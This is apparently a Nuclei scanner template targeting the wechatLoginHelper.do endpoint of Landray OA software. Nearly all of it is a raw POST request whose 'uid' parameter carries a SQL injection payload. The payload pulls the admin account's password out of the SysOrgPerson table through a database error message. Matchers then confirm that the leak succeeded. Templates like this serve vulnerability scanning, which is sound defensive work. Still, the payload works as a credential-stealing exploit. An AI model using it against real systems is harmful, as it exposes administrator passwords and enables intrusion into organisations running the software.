
id: landray_wechatLoginHelper_uid_sqli

info:
  name: landray_wechatLoginHelper_uid_sqli
  author: Administrator
  severity: high

http:
  - raw:
      - |-
        POST /third/wechat/wechatLoginHelper.do HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 164

        method=edit&uid=1'and+(SELECT+'password-is:'%2BfdPassword%2B'----'+FROM+com.landray.kmss.sys.organization.model.SysOrgPerson+where+fdLoginName='admin')=1+and+'1'='1
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'password-is'
      - type: word
        part: body
        words:
          - 'nvarchar'